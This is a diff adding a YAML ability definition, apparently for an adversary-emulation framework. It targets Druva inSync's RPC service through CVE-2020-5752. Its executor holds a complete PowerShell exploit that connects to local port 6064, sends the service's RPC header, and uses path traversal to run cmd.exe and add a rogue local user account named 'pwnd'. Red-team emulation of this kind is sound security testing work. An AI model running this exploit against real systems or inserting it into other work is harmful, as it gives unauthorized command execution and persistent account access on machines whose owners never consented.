@@ -1,0 +1,42 @@
+- technique_id: T1203
+  name: Arbitrary command execution through software vulnerability exploitation -
+    Windows - PowerShell
+  singleton: true
+  privilege: ''
+  repeatable: false
+  technique_name: Exploitation for Client Execution
+  requirements: []
+  additional_info:
+    cleanup: '[]'
+  tactic: execution
+  description: Druva inSync exposes an RPC service which is vulnerable to a command
+    injection attack (https://www.exploit-db.com/exploits/49211). This ability exploits
+    CVE-2020-5752 to execute arbitrary commands (create a fake account) through the
+    Druva inSync RPC service
+  executors:
+  - timeout: 60
+    variations: []
+    command: "$ErrorActionPreference = \"Stop\"; $cmd = \"net user pwnd /add\"; $s\
+      \ = New-Object System.Net.Sockets.Socket(\n    [System.Net.Sockets.AddressFamily]::InterNetwork,\n\
+      \    [System.Net.Sockets.SocketType]::Stream,\n    [System.Net.Sockets.ProtocolType]::Tcp\n\
+      ); $s.Connect(\"127.0.0.1\", 6064); $header = [System.Text.Encoding]::UTF8.GetBytes(\"\
+      inSync PHC RPCW[v0002]\"); $rpcType = [System.Text.Encoding]::UTF8.GetBytes(\"\
+      $([char]0x0005)`0`0`0\"); $command = [System.Text.Encoding]::Unicode.GetBytes(\"\
+      C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\"\
+      ); $length = [System.BitConverter]::GetBytes($command.Length); $s.Send($header);\
+      \ $s.Send($rpcType); $s.Send($length); $s.Send($command)"
+    name: psh
+    payloads: []
+    additional_info: {}
+    uploads: []
+    parsers: []
+    cleanup: []
+    code: null
+    language: null
+    build_target: null
+    platform: windows
+  access: {}
+  plugin: ''
+  delete_payload: true
+  buckets: []
+  id: 043367ae-1353-4ba2-9a3a-0b149881648d
